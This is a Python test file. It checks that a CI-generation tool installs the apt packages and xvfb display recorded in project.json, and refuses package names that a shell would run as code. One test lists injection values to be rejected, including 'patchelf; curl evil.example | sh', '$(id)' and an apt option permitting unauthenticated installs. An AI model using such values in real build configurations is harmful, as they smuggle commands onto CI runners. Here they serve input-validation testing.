"""What the CI runner needs beyond a toolchain: system packages, and a display for a smoke that opens a window.

A desktop application wrapped by `adopt` builds against system libraries no `setup-*` action installs (a Tauri app
needs WebKitGTK), and its smoke opens a window, which a runner cannot do without a virtual display. An application
records both under `runner` in `project.json` — `packages`, a list of apt package names, and `display`, true for a
smoke that needs one — and the gate's workflow installs them before `install`, and runs `smoke` under `xvfb-run`.
The names reach a shell line on the runner, so each one is held to Debian's package-name rule and anything else is
refused: `project.json` is part of the tree the workflow runs on, and a pull request can change it.
"""
from __future__ import annotations

import json
import re
import subprocess
import tempfile
from pathlib import Path

from support import FactoryTestCase
from test_adopt import repository, slipwai

NODE = {
    "package.json": '{"name": "shop", "scripts": {"test": "node --test"}}\n',
    "package-lock.json": '{"name": "shop", "lockfileVersion": 3, "requires": true, "packages": {}}\n',
    "index.js": "module.exports = 1;\n",
}
APT = "sudo apt-get update -q && sudo apt-get install -y -q"
INSTALL, VERIFY, SMOKE = (f"make -f delivery/Makefile {target}" for target in ("install", "verify", "smoke"))


def steps(text: str) -> list[str]:
    """Every `run:` step of a job, in order."""
    return re.findall(r"(?m)^      - run: (.+?)(?:  #.*)?$", text)


class AdoptedCiRunnerTest(FactoryTestCase):
    def adopted(
        self, directory: str, forge: dict[str, str], runner: object
    ) -> tuple[Path, subprocess.CompletedProcess[str]]:
        repo = repository(Path(directory), "shop", {**NODE, **forge})
        result = slipwai(repo, "adopt", "--yes")
        self.assertEqual(result.returncode, 0, result.stderr)
        document = json.loads((repo / "project.json").read_text())
        document["deployables"]["shop"]["commands"]["smoke"] = "node index.js"
        document["deployables"]["shop"]["runner"] = runner
        (repo / "project.json").write_text(json.dumps(document, indent=2) + "\n")
        return repo, slipwai(repo, "adopt", "--refresh")

    def github(self, runner: object) -> tuple[str, str]:
        with tempfile.TemporaryDirectory() as directory:
            repo, refreshed = self.adopted(directory, {".github/workflows/ci.yml": "on: push\njobs: {}\n"}, runner)
            self.assertEqual(refreshed.returncode, 0, refreshed.stdout + refreshed.stderr)
            workflow = (repo / ".github/workflows/verify-delivery.yml").read_text()
            verify, smoke = workflow.split("\n  smoke:\n", 1)
            return verify, smoke

    def test_recorded_packages_are_installed_before_install_in_both_jobs(self) -> None:
        verify, smoke = self.github({"packages": ["libwebkit2gtk-4.1-dev", "patchelf", "libwebkit2gtk-4.1-dev"]})

        self.assertEqual(steps(verify), [f"{APT} libwebkit2gtk-4.1-dev patchelf", INSTALL, VERIFY])
        self.assertEqual(steps(smoke), [f"{APT} libwebkit2gtk-4.1-dev patchelf", INSTALL, SMOKE])

    def test_a_smoke_that_needs_a_display_runs_under_xvfb_and_only_the_smoke_job_installs_it(self) -> None:
        verify, smoke = self.github({"packages": ["patchelf"], "display": True})

        self.assertEqual(steps(verify)[0], f"{APT} patchelf")
        self.assertEqual(steps(smoke), [f"{APT} patchelf xvfb", INSTALL, f"xvfb-run -a {SMOKE}"])

    def test_no_runner_writes_no_apt_step(self) -> None:
        verify, smoke = self.github({})

        self.assertFalse(any("apt-get" in step for step in steps(verify) + steps(smoke)), verify + smoke)

    def test_the_record_survives_a_refresh_unchanged(self) -> None:
        runner = {"packages": ["patchelf"], "display": True}
        with tempfile.TemporaryDirectory() as directory:
            repo, refreshed = self.adopted(directory, {".github/workflows/ci.yml": "on: push\njobs: {}\n"}, runner)
            self.assertEqual(refreshed.returncode, 0, refreshed.stderr)
            again = slipwai(repo, "adopt", "--refresh")
            self.assertEqual(again.returncode, 0, again.stderr)

            document = json.loads((repo / "project.json").read_text())
            self.assertEqual(document["deployables"]["shop"]["runner"], runner)

    def test_a_package_name_the_shell_would_read_as_code_is_refused(self) -> None:
        for runner in (
            {"packages": ["patchelf; curl evil.example | sh"]},
            {"packages": ["$(id)"]},
            {"packages": ["-o=APT::Get::AllowUnauthenticated=true"]},
            {"packages": "patchelf"},
            {"display": "yes"},
            {"image": "ubuntu"},
        ):
            with self.subTest(runner), tempfile.TemporaryDirectory() as directory:
                repo, refreshed = self.adopted(directory, {".github/workflows/ci.yml": "on: push\njobs: {}\n"}, runner)
                self.assertNotEqual(refreshed.returncode, 0, refreshed.stdout)
                self.assertIn("'runner'", refreshed.stderr)
                workflow = (repo / ".github/workflows/verify-delivery.yml").read_text()
                self.assertNotIn("apt-get", workflow, "nothing reached the workflow")

    def test_a_gitlab_job_names_what_its_image_must_carry(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            repo, refreshed = self.adopted(
                directory, {".gitlab-ci.yml": "test:\n  script: [true]\n"}, {"packages": ["patchelf"], "display": True},
            )
            self.assertEqual(refreshed.returncode, 0, refreshed.stdout + refreshed.stderr)

            job = (repo / "delivery/ci/verify-delivery.gitlab-ci.yml").read_text()

            self.assertIn("# the image must carry these system packages: patchelf\n", job)
            smoke = job.split("\nsmoke-delivery:\n", 1)[1]
            self.assertIn("    - xvfb-run -a make -f delivery/Makefile smoke\n", smoke)
            self.assertIn("xvfb", smoke.split("script:")[0])
